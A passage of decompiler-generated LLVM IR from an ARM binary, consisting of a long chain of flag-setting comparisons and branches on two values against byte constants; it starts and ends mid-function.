  br label %bb1484

bb1484:                                           ; preds = %dec_label_pc_ee24, %bb1483
  %v0_ee30835 = phi i32 [ %v4_ee10, %dec_label_pc_ee24 ], [ 0, %bb1483 ]
  %v2_ee2c = xor i1 %v7_ec6c, true
  %v3_ee2c = and i1 %v2_ec6c, %v2_ee2c
  br i1 %v3_ee2c, label %bb1485, label %bb1486

bb1485:                                           ; preds = %bb1484
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1486

bb1486:                                           ; preds = %bb1484, %bb1485
  %v0_ee30 = phi i32 [ %v0_ee30835, %bb1484 ], [ 1, %bb1485 ]
  %v2_ee34 = icmp ugt i32 %v1_e8d4, 127
  store i1 %v2_ee34, i1* %cpsr_c.global-to-local, align 1
  %v7_ee34 = icmp eq i32 %v1_e8d4, 128
  store i1 %v7_ee34, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ee34, label %.thread133, label %.thread134

.thread134:                                       ; preds = %bb1486
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ee50

.thread133:                                       ; preds = %bb1486
  %v2_ee3c = urem i32 %v0_ee30, 2
  store i32 %v2_ee3c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee40 = icmp eq i32 %v2_ee3c, 0
  store i1 %v2_ee40, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee40, label %dec_label_pc_ee50, label %dec_label_pc_ee48

dec_label_pc_ee48:                                ; preds = %.thread133
  %v2_ee48 = icmp ugt i32 %v1_e8e8, 235
  store i1 %v2_ee48, i1* %cpsr_c.global-to-local, align 1
  %v7_ee48 = icmp eq i32 %v1_e8e8, 236
  store i1 %v7_ee48, i1* %cpsr_z.global-to-local, align 1
  %v2_ee4c = xor i1 %v2_ee48, true
  %v3_ee4c = or i1 %v7_ee48, %v2_ee4c
  br i1 %v3_ee4c, label %dec_label_pc_e8d0, label %dec_label_pc_ee50

dec_label_pc_ee50:                                ; preds = %.thread134, %dec_label_pc_ee48, %.thread133
  %v7_ee50 = icmp eq i32 %v1_e8d4, 129
  %.2005 = zext i1 %v7_ee50 to i32
  store i32 %.2005, i32* %r3.global-to-local, align 4
  %v2_ee5c = icmp ugt i32 %v1_e8e8, 20
  store i1 %v2_ee5c, i1* %cpsr_c.global-to-local, align 1
  %v7_ee5c = icmp eq i32 %v1_e8e8, 21
  store i1 %v7_ee5c, i1* %cpsr_z.global-to-local, align 1
  %v2_ee60 = xor i1 %v2_ee5c, true
  %v3_ee60 = or i1 %v7_ee5c, %v2_ee60
  br i1 %v3_ee60, label %.thread139, label %bb1489

.thread139:                                       ; preds = %dec_label_pc_ee50
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ee74

bb1489:                                           ; preds = %dec_label_pc_ee50
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee64 = icmp eq i1 %v7_ee50, false
  store i1 %v2_ee64, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee64, label %dec_label_pc_ee74, label %dec_label_pc_ee6c

dec_label_pc_ee6c:                                ; preds = %bb1489
  %v2_ee6c = icmp eq i32 %v1_e8e8, 255
  store i1 %v2_ee6c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_ee6c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee6c, label %dec_label_pc_ee74, label %dec_label_pc_e8d0

dec_label_pc_ee74:                                ; preds = %.thread139, %dec_label_pc_ee6c, %bb1489
  %v7_ee74 = icmp eq i32 %v1_e8d4, 130
  %.2006 = zext i1 %v7_ee74 to i32
  store i32 %.2006, i32* %r3.global-to-local, align 4
  %v2_ee80 = icmp ugt i32 %v1_e8e8, 38
  store i1 %v2_ee80, i1* %cpsr_c.global-to-local, align 1
  %v7_ee80 = icmp eq i32 %v1_e8e8, 39
  store i1 %v7_ee80, i1* %cpsr_z.global-to-local, align 1
  %v2_ee84 = xor i1 %v2_ee80, true
  %v3_ee84 = or i1 %v7_ee80, %v2_ee84
  br i1 %v3_ee84, label %.thread144, label %bb1492

.thread144:                                       ; preds = %dec_label_pc_ee74
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ee98

bb1492:                                           ; preds = %dec_label_pc_ee74
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ee88 = icmp eq i1 %v7_ee74, false
  store i1 %v2_ee88, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ee88, label %dec_label_pc_ee98, label %dec_label_pc_ee90

dec_label_pc_ee90:                                ; preds = %bb1492
  %v2_ee90 = icmp ugt i32 %v1_e8e8, 166
  store i1 %v2_ee90, i1* %cpsr_c.global-to-local, align 1
  %v7_ee90 = icmp eq i32 %v1_e8e8, 167
  store i1 %v7_ee90, i1* %cpsr_z.global-to-local, align 1
  %v2_ee94 = xor i1 %v2_ee90, true
  %v3_ee94 = or i1 %v7_ee90, %v2_ee94
  br i1 %v3_ee94, label %dec_label_pc_e8d0, label %dec_label_pc_ee98

dec_label_pc_ee98:                                ; preds = %.thread144, %dec_label_pc_ee90, %bb1492
  %v2_ee98 = icmp ugt i32 %v1_e8e8, 1
  store i1 %v2_ee98, i1* %cpsr_c.global-to-local, align 1
  %v7_ee98 = icmp eq i32 %v1_e8e8, 2
  store i1 %v7_ee98, i1* %cpsr_z.global-to-local, align 1
  %v2_ee9c = xor i1 %v2_ee98, true
  %v3_ee9c = or i1 %v7_ee98, %v2_ee9c
  br i1 %v3_ee9c, label %bb1493, label %bb1494

bb1493:                                           ; preds = %dec_label_pc_ee98
  br label %bb1494

bb1494:                                           ; preds = %dec_label_pc_ee98, %bb1493
  %v1_eeac840 = phi i32 [ %.2004, %dec_label_pc_ee98 ], [ 0, %bb1493 ]
  %v2_eea0 = xor i1 %v7_ee98, true
  %v3_eea0 = and i1 %v2_ee98, %v2_eea0
  br i1 %v3_eea0, label %bb1495, label %bb1496

bb1495:                                           ; preds = %bb1494
  br label %bb1496

bb1496:                                           ; preds = %bb1494, %bb1495
  %v1_eec8 = phi i32 [ %v1_eeac840, %bb1494 ], [ 1, %bb1495 ]
  %v2_eea4 = icmp ugt i32 %v1_e8d4, 130
  store i1 %v2_eea4, i1* %cpsr_c.global-to-local, align 1
  %v7_eea4 = icmp eq i32 %v1_e8d4, 131
  store i1 %v7_eea4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eea4, label %.thread147, label %.thread148

.thread148:                                       ; preds = %bb1496
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_eec0

.thread147:                                       ; preds = %bb1496
  %v2_eeac = urem i32 %v1_eec8, 2
  store i32 %v2_eeac, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eeb0 = icmp eq i32 %v2_eeac, 0
  store i1 %v2_eeb0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eeb0, label %dec_label_pc_eec0, label %dec_label_pc_eeb8

dec_label_pc_eeb8:                                ; preds = %.thread147
  %v2_eeb8 = icmp ugt i32 %v1_e8e8, 249
  store i1 %v2_eeb8, i1* %cpsr_c.global-to-local, align 1
  %v7_eeb8 = icmp eq i32 %v1_e8e8, 250
  store i1 %v7_eeb8, i1* %cpsr_z.global-to-local, align 1
  %v2_eebc = xor i1 %v2_eeb8, true
  %v3_eebc = or i1 %v7_eeb8, %v2_eebc
  br i1 %v3_eebc, label %dec_label_pc_e8d0, label %dec_label_pc_eec0

dec_label_pc_eec0:                                ; preds = %.thread148, %dec_label_pc_eeb8, %.thread147
  %v2_eec0 = icmp ugt i32 %v1_e8d4, 131
  store i1 %v2_eec0, i1* %cpsr_c.global-to-local, align 1
  %v7_eec0 = icmp eq i32 %v1_e8d4, 132
  store i1 %v7_eec0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eec0, label %.thread151, label %.thread152

.thread152:                                       ; preds = %dec_label_pc_eec0
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_eedc

.thread151:                                       ; preds = %dec_label_pc_eec0
  %v2_eec8 = urem i32 %v1_eec8, 2
  store i32 %v2_eec8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eecc = icmp eq i32 %v2_eec8, 0
  store i1 %v2_eecc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eecc, label %dec_label_pc_eedc, label %dec_label_pc_eed4

dec_label_pc_eed4:                                ; preds = %.thread151
  %v2_eed4 = icmp ugt i32 %v1_e8e8, 249
  store i1 %v2_eed4, i1* %cpsr_c.global-to-local, align 1
  %v7_eed4 = icmp eq i32 %v1_e8e8, 250
  store i1 %v7_eed4, i1* %cpsr_z.global-to-local, align 1
  %v2_eed8 = xor i1 %v2_eed4, true
  %v3_eed8 = or i1 %v7_eed4, %v2_eed8
  br i1 %v3_eed8, label %dec_label_pc_e8d0, label %dec_label_pc_eedc

dec_label_pc_eedc:                                ; preds = %.thread152, %dec_label_pc_eed4, %.thread151
  %v2_eedc = icmp ugt i32 %v1_e8e8, 3
  store i1 %v2_eedc, i1* %cpsr_c.global-to-local, align 1
  %v7_eedc = icmp eq i32 %v1_e8e8, 4
  store i1 %v7_eedc, i1* %cpsr_z.global-to-local, align 1
  %v2_eee0 = xor i1 %v2_eedc, true
  %v3_eee0 = or i1 %v7_eedc, %v2_eee0
  br i1 %v3_eee0, label %bb1497, label %bb1498

bb1497:                                           ; preds = %dec_label_pc_eedc
  br label %bb1498

bb1498:                                           ; preds = %dec_label_pc_eedc, %bb1497
  %v1_eef0842 = phi i32 [ %v1_eec8, %dec_label_pc_eedc ], [ 0, %bb1497 ]
  %v2_eee4 = xor i1 %v7_eedc, true
  %v3_eee4 = and i1 %v2_eedc, %v2_eee4
  br i1 %v3_eee4, label %bb1499, label %bb1500

bb1499:                                           ; preds = %bb1498
  br label %bb1500

bb1500:                                           ; preds = %bb1498, %bb1499
  %v1_f108 = phi i32 [ %v1_eef0842, %bb1498 ], [ 1, %bb1499 ]
  %v2_eee8 = icmp ugt i32 %v1_e8d4, 133
  store i1 %v2_eee8, i1* %cpsr_c.global-to-local, align 1
  %v7_eee8 = icmp eq i32 %v1_e8d4, 134
  store i1 %v7_eee8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eee8, label %.thread155, label %.thread156

.thread156:                                       ; preds = %bb1500
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef04

.thread155:                                       ; preds = %bb1500
  %v2_eef0 = urem i32 %v1_f108, 2
  store i32 %v2_eef0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eef4 = icmp eq i32 %v2_eef0, 0
  store i1 %v2_eef4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eef4, label %dec_label_pc_ef04, label %dec_label_pc_eefc

dec_label_pc_eefc:                                ; preds = %.thread155
  %v2_eefc = icmp ugt i32 %v1_e8e8, 233
  store i1 %v2_eefc, i1* %cpsr_c.global-to-local, align 1
  %v7_eefc = icmp eq i32 %v1_e8e8, 234
  store i1 %v7_eefc, i1* %cpsr_z.global-to-local, align 1
  %v2_ef00 = xor i1 %v2_eefc, true
  %v3_ef00 = or i1 %v7_eefc, %v2_ef00
  br i1 %v3_ef00, label %dec_label_pc_e8d0, label %dec_label_pc_ef04

dec_label_pc_ef04:                                ; preds = %.thread156, %dec_label_pc_eefc, %.thread155
  %v7_ef04 = icmp eq i32 %v1_e8d4, 136
  %.2007 = zext i1 %v7_ef04 to i32
  store i32 %.2007, i32* %r3.global-to-local, align 4
  %v2_ef10 = icmp ugt i32 %v1_e8e8, 175
  store i1 %v2_ef10, i1* %cpsr_c.global-to-local, align 1
  %v7_ef10 = icmp eq i32 %v1_e8e8, 176
  store i1 %v7_ef10, i1* %cpsr_z.global-to-local, align 1
  %v2_ef14 = xor i1 %v2_ef10, true
  %v3_ef14 = or i1 %v7_ef10, %v2_ef14
  br i1 %v3_ef14, label %.thread161, label %bb1503

.thread161:                                       ; preds = %dec_label_pc_ef04
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_ef28

bb1503:                                           ; preds = %dec_label_pc_ef04
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef18 = icmp eq i1 %v7_ef04, false
  store i1 %v2_ef18, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef18, label %dec_label_pc_ef28, label %dec_label_pc_ef20

dec_label_pc_ef20:                                ; preds = %bb1503
  %v2_ef20 = icmp ugt i32 %v1_e8e8, 221
  store i1 %v2_ef20, i1* %cpsr_c.global-to-local, align 1
  %v7_ef20 = icmp eq i32 %v1_e8e8, 222
  store i1 %v7_ef20, i1* %cpsr_z.global-to-local, align 1
  %v2_ef24 = xor i1 %v2_ef20, true
  %v3_ef24 = or i1 %v7_ef20, %v2_ef24
  br i1 %v3_ef24, label %dec_label_pc_e8d0, label %dec_label_pc_ef28

dec_label_pc_ef28:                                ; preds = %.thread161, %dec_label_pc_ef20, %bb1503
  %v7_ef28 = icmp eq i32 %v1_e8d4, 138
  %.2008 = zext i1 %v7_ef28 to i32
  store i32 %.2008, i32* %r3.global-to-local, align 4
  %v2_ef38 = icmp ugt i32 %v1_e8e8, 11
  store i1 %v2_ef38, i1* %cpsr_c.global-to-local, align 1
  %v7_ef38 = icmp eq i32 %v1_e8e8, 12
  store i1 %v7_ef38, i1* %cpsr_z.global-to-local, align 1
  %v2_ef3c = xor i1 %v2_ef38, true
  %v3_ef3c = or i1 %v7_ef38, %v2_ef3c
  br i1 %v3_ef3c, label %bb1506, label %bb1507

bb1506:                                           ; preds = %dec_label_pc_ef28
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1507

bb1507:                                           ; preds = %dec_label_pc_ef28, %bb1506
  %v4_ef40 = phi i32 [ %.2008, %dec_label_pc_ef28 ], [ 0, %bb1506 ]
  %v2_ef40 = xor i1 %v7_ef38, true
  %v3_ef40 = and i1 %v2_ef38, %v2_ef40
  br i1 %v3_ef40, label %bb1508, label %thread-pre-split165

bb1508:                                           ; preds = %bb1507
  store i32 %v4_ef40, i32* %r3.global-to-local, align 4
  br label %thread-pre-split165

thread-pre-split165:                              ; preds = %bb1507, %bb1508
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef44 = icmp eq i32 %v4_ef40, 0
  store i1 %v2_ef44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef44, label %dec_label_pc_ef58, label %dec_label_pc_ef50

dec_label_pc_ef50:                                ; preds = %thread-pre-split165
  %v2_ef50 = icmp ugt i32 %v1_e8e8, 192
  store i1 %v2_ef50, i1* %cpsr_c.global-to-local, align 1
  %v7_ef50 = icmp eq i32 %v1_e8e8, 193
  store i1 %v7_ef50, i1* %cpsr_z.global-to-local, align 1
  %v2_ef54 = xor i1 %v2_ef50, true
  %v3_ef54 = or i1 %v7_ef50, %v2_ef54
  br i1 %v3_ef54, label %dec_label_pc_e8d0, label %dec_label_pc_ef58

dec_label_pc_ef58:                                ; preds = %dec_label_pc_ef50, %thread-pre-split165
  %v7_ef58 = icmp eq i32 %v1_e8d4, 139
  %.2009 = zext i1 %v7_ef58 to i32
  store i32 %.2009, i32* %r3.global-to-local, align 4
  store i1 %v2_ec94, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ec94, i1* %cpsr_z.global-to-local, align 1
  %v2_ef6c = xor i1 %v2_ec94, true
  %v3_ef6c = or i1 %v7_ec94, %v2_ef6c
  br i1 %v3_ef6c, label %bb1511, label %bb1512

bb1511:                                           ; preds = %dec_label_pc_ef58
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1512

bb1512:                                           ; preds = %dec_label_pc_ef58, %bb1511
  %v4_ef70 = phi i32 [ %.2009, %dec_label_pc_ef58 ], [ 0, %bb1511 ]
  %v2_ef70 = xor i1 %v7_ec94, true
  %v3_ef70 = and i1 %v2_ec94, %v2_ef70
  br i1 %v3_ef70, label %bb1513, label %thread-pre-split167

bb1513:                                           ; preds = %bb1512
  store i32 %v4_ef70, i32* %r3.global-to-local, align 4
  br label %thread-pre-split167

thread-pre-split167:                              ; preds = %bb1512, %bb1513
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef74 = icmp eq i32 %v4_ef70, 0
  store i1 %v2_ef74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef74, label %dec_label_pc_ef84, label %dec_label_pc_ef7c

dec_label_pc_ef7c:                                ; preds = %thread-pre-split167
  %v2_ef7c = icmp ugt i32 %v1_e8e8, 141
  store i1 %v2_ef7c, i1* %cpsr_c.global-to-local, align 1
  %v7_ef7c = icmp eq i32 %v1_e8e8, 142
  store i1 %v7_ef7c, i1* %cpsr_z.global-to-local, align 1
  %v2_ef80 = xor i1 %v2_ef7c, true
  %v3_ef80 = or i1 %v7_ef7c, %v2_ef80
  br i1 %v3_ef80, label %dec_label_pc_e8d0, label %dec_label_pc_ef84

dec_label_pc_ef84:                                ; preds = %dec_label_pc_ef7c, %thread-pre-split167
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef84 = icmp eq i32 %v1_e8e8, 0
  store i1 %v2_ef84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef84, label %bb1515, label %bb1514

bb1514:                                           ; preds = %dec_label_pc_ef84
  br label %bb1515

bb1515:                                           ; preds = %dec_label_pc_ef84, %bb1514
  %v0_ff48 = phi i32 [ 0, %dec_label_pc_ef84 ], [ 1, %bb1514 ]
  store i32 %v0_ff48, i32* %r3.global-to-local, align 4
  %v2_ef90 = icmp ugt i32 %v1_e8d4, 139
  store i1 %v2_ef90, i1* %cpsr_c.global-to-local, align 1
  %v7_ef90 = icmp eq i32 %v1_e8d4, 140
  store i1 %v7_ef90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ef90, label %bb1516, label %.thread1151

.thread1151:                                      ; preds = %bb1515
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_efb0

bb1516:                                           ; preds = %bb1515
  store i32 %v0_ff48, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ef9c = icmp eq i32 %v0_ff48, 0
  store i1 %v2_ef9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_ef9c, label %dec_label_pc_efb0, label %dec_label_pc_efa8

dec_label_pc_efa8:                                ; preds = %bb1516
  store i1 %v2_eb00, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_eb00, i1* %cpsr_z.global-to-local, align 1
  %v2_efac = xor i1 %v2_eb00, true
  %v3_efac = or i1 %v7_eb00, %v2_efac
  br i1 %v3_efac, label %dec_label_pc_e8d0, label %dec_label_pc_efb0

dec_label_pc_efb0:                                ; preds = %.thread1151, %dec_label_pc_efa8, %bb1516
  %v0_ef9c1153 = phi i32 [ 0, %.thread1151 ], [ 1, %dec_label_pc_efa8 ], [ 0, %bb1516 ]
  store i1 %v2_ebf0, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ebf0, i1* %cpsr_z.global-to-local, align 1
  %v2_efb4 = xor i1 %v2_ebf0, true
  %v3_efb4 = or i1 %v7_ebf0, %v2_efb4
  br i1 %v3_efb4, label %bb1517, label %bb1518

bb1517:                                           ; preds = %dec_label_pc_efb0
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1518

bb1518:                                           ; preds = %dec_label_pc_efb0, %bb1517
  %v0_efbc851 = phi i32 [ %v0_ef9c1153, %dec_label_pc_efb0 ], [ 0, %bb1517 ]
  %v2_efb8 = xor i1 %v7_ebf0, true
  %v3_efb8 = and i1 %v2_ebf0, %v2_efb8
  br i1 %v3_efb8, label %bb1519, label %bb1520

bb1519:                                           ; preds = %bb1518
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1520

bb1520:                                           ; preds = %bb1518, %bb1519
  %v0_efbc = phi i32 [ %v0_efbc851, %bb1518 ], [ 1, %bb1519 ]
  %v2_efc0 = icmp ugt i32 %v1_e8d4, 142
  store i1 %v2_efc0, i1* %cpsr_c.global-to-local, align 1
  %v7_efc0 = icmp eq i32 %v1_e8d4, 143
  store i1 %v7_efc0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_efc0, label %.thread169, label %.thread170

.thread170:                                       ; preds = %bb1520
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_efdc

.thread169:                                       ; preds = %bb1520
  %v2_efc8 = urem i32 %v0_efbc, 2
  store i32 %v2_efc8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_efcc = icmp eq i32 %v2_efc8, 0
  store i1 %v2_efcc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_efcc, label %dec_label_pc_efdc, label %dec_label_pc_efd4

dec_label_pc_efd4:                                ; preds = %.thread169
  %v2_efd4 = icmp ugt i32 %v1_e8e8, 231
  store i1 %v2_efd4, i1* %cpsr_c.global-to-local, align 1
  %v7_efd4 = icmp eq i32 %v1_e8e8, 232
  store i1 %v7_efd4, i1* %cpsr_z.global-to-local, align 1
  %v2_efd8 = xor i1 %v2_efd4, true
  %v3_efd8 = or i1 %v7_efd4, %v2_efd8
  br i1 %v3_efd8, label %dec_label_pc_e8d0, label %dec_label_pc_efdc

dec_label_pc_efdc:                                ; preds = %.thread170, %dec_label_pc_efd4, %.thread169
  %v7_efdc = icmp eq i32 %v1_e8d4, 144
  %.2010 = zext i1 %v7_efdc to i32
  store i32 %.2010, i32* %r3.global-to-local, align 4
  store i1 %v2_e9bc, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_e9bc, i1* %cpsr_z.global-to-local, align 1
  %v2_efec = xor i1 %v2_e9bc, true
  %v3_efec = or i1 %v7_e9bc, %v2_efec
  br i1 %v3_efec, label %.thread175, label %bb1523

.thread175:                                       ; preds = %dec_label_pc_efdc
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_f000

bb1523:                                           ; preds = %dec_label_pc_efdc
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eff0 = icmp eq i1 %v7_efdc, false
  store i1 %v2_eff0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_eff0, label %dec_label_pc_f000, label %dec_label_pc_eff8

dec_label_pc_eff8:                                ; preds = %bb1523
  %v2_eff8 = icmp ugt i32 %v1_e8e8, 251
  store i1 %v2_eff8, i1* %cpsr_c.global-to-local, align 1
  %v7_eff8 = icmp eq i32 %v1_e8e8, 252
  store i1 %v7_eff8, i1* %cpsr_z.global-to-local, align 1
  %v2_effc = xor i1 %v2_eff8, true
  %v3_effc = or i1 %v7_eff8, %v2_effc
  br i1 %v3_effc, label %dec_label_pc_e8d0, label %dec_label_pc_f000

dec_label_pc_f000:                                ; preds = %.thread175, %dec_label_pc_eff8, %bb1523
  %v0_f00c.pr855 = phi i32 [ 0, %.thread175 ], [ 1, %dec_label_pc_eff8 ], [ 0, %bb1523 ]
  %v2_f000 = icmp ugt i32 %v1_e8e8, 163
  store i1 %v2_f000, i1* %cpsr_c.global-to-local, align 1
  %v7_f000 = icmp eq i32 %v1_e8e8, 164
  store i1 %v7_f000, i1* %cpsr_z.global-to-local, align 1
  %v2_f004 = xor i1 %v2_f000, true
  %v3_f004 = or i1 %v7_f000, %v2_f004
  br i1 %v3_f004, label %bb1524, label %bb1525

bb1524:                                           ; preds = %dec_label_pc_f000
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1525

bb1525:                                           ; preds = %dec_label_pc_f000, %bb1524
  %v0_f00c.pr = phi i32 [ %v0_f00c.pr855, %dec_label_pc_f000 ], [ 0, %bb1524 ]
  %v2_f008 = xor i1 %v7_f000, true
  %v3_f008 = and i1 %v2_f000, %v2_f008
  br i1 %v3_f008, label %bb1526, label %thread-pre-split178

bb1526:                                           ; preds = %bb1525
  store i32 %.1976, i32* %r3.global-to-local, align 4
  br label %thread-pre-split178

thread-pre-split178:                              ; preds = %bb1525, %bb1526
  %v0_f00c = phi i32 [ %.1976, %bb1526 ], [ %v0_f00c.pr, %bb1525 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f00c = icmp eq i32 %v0_f00c, 0
  store i1 %v2_f00c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f00c, label %dec_label_pc_f01c, label %dec_label_pc_f014

dec_label_pc_f014:                                ; preds = %thread-pre-split178
  %v2_f014 = icmp ugt i32 %v1_e8e8, 164
  store i1 %v2_f014, i1* %cpsr_c.global-to-local, align 1
  %v7_f014 = icmp eq i32 %v1_e8e8, 165
  store i1 %v7_f014, i1* %cpsr_z.global-to-local, align 1
  %v2_f018 = xor i1 %v2_f014, true
  %v3_f018 = or i1 %v7_f014, %v2_f018
  br i1 %v3_f018, label %dec_label_pc_e8d0, label %dec_label_pc_f01c

dec_label_pc_f01c:                                ; preds = %dec_label_pc_f014, %thread-pre-split178
  %v2_f020 = and i32 %v0_ee30, %.1980
  %v4_f020 = icmp eq i32 %v2_f020, 0
  store i1 %v4_f020, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f020, label %dec_label_pc_f030, label %dec_label_pc_f028

dec_label_pc_f028:                                ; preds = %dec_label_pc_f01c
  %v2_f028 = icmp ugt i32 %v1_e8e8, 41
  store i1 %v2_f028, i1* %cpsr_c.global-to-local, align 1
  %v7_f028 = icmp eq i32 %v1_e8e8, 42
  store i1 %v7_f028, i1* %cpsr_z.global-to-local, align 1
  %v2_f02c = xor i1 %v2_f028, true
  %v3_f02c = or i1 %v7_f028, %v2_f02c
  br i1 %v3_f02c, label %dec_label_pc_e8d0, label %dec_label_pc_f030

dec_label_pc_f030:                                ; preds = %dec_label_pc_f028, %dec_label_pc_f01c
  store i1 %v2_ec3c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v7_ec3c, i1* %cpsr_z.global-to-local, align 1
  %v2_f034 = xor i1 %v2_ec3c, true
  %v3_f034 = or i1 %v7_ec3c, %v2_f034
  br i1 %v3_f034, label %bb1527, label %bb1528

bb1527:                                           ; preds = %dec_label_pc_f030
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1528

bb1528:                                           ; preds = %dec_label_pc_f030, %bb1527
  %v1_f03c858 = phi i32 [ %v0_f00c, %dec_label_pc_f030 ], [ 0, %bb1527 ]
  %v2_f038 = xor i1 %v7_ec3c, true
  %v3_f038 = and i1 %v2_ec3c, %v2_f038
  br i1 %v3_f038, label %bb1529, label %bb1530

bb1529:                                           ; preds = %bb1528
  store i32 1, i32* %r3.global-to-local, align 4
  br label %bb1530

bb1530:                                           ; preds = %bb1528, %bb1529
  %v1_f03c = phi i32 [ %v1_f03c858, %bb1528 ], [ 1, %bb1529 ]
  %v2_f03c = and i32 %v1_f03c, %.1980
  %v4_f03c = icmp eq i32 %v2_f03c, 0
  store i1 %v4_f03c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v4_f03c, label %dec_label_pc_f050, label %dec_label_pc_f048

dec_label_pc_f048:                                ; preds = %bb1530
  %v2_f048 = icmp ugt i32 %v1_e8e8, 103
  store i1 %v2_f048, i1* %cpsr_c.global-to-local, align 1
  %v7_f048 = icmp eq i32 %v1_e8e8, 104
  store i1 %v7_f048, i1* %cpsr_z.global-to-local, align 1
  %v2_f04c = xor i1 %v2_f048, true
  %v3_f04c = or i1 %v7_f048, %v2_f04c
  br i1 %v3_f04c, label %dec_label_pc_e8d0, label %dec_label_pc_f050

dec_label_pc_f050:                                ; preds = %dec_label_pc_f048, %bb1530
  %v2_f050 = icmp ugt i32 %v1_e8e8, 166
  store i1 %v2_f050, i1* %cpsr_c.global-to-local, align 1
  %v7_f050 = icmp eq i32 %v1_e8e8, 167
  store i1 %v7_f050, i1* %cpsr_z.global-to-local, align 1
  %v2_f054 = xor i1 %v2_f050, true
  %v3_f054 = or i1 %v7_f050, %v2_f054
  br i1 %v3_f054, label %bb1531, label %bb1532

bb1531:                                           ; preds = %dec_label_pc_f050
  store i32 0, i32* %r3.global-to-local, align 4
  br label %bb1532

bb1532:                                           ; preds = %dec_label_pc_f050, %bb1531
  %v0_f05c.pr = phi i32 [ %v1_f03c, %dec_label_pc_f050 ], [ 0, %bb1531 ]
  %v2_f058 = xor i1 %v7_f050, true
  %v3_f058 = and i1 %v2_f050, %v2_f058
  br i1 %v3_f058, label %bb1533, label %thread-pre-split179

bb1533:                                           ; preds = %bb1532
  store i32 %.1980, i32* %r3.global-to-local, align 4
  br label %thread-pre-split179

thread-pre-split179:                              ; preds = %bb1532, %bb1533
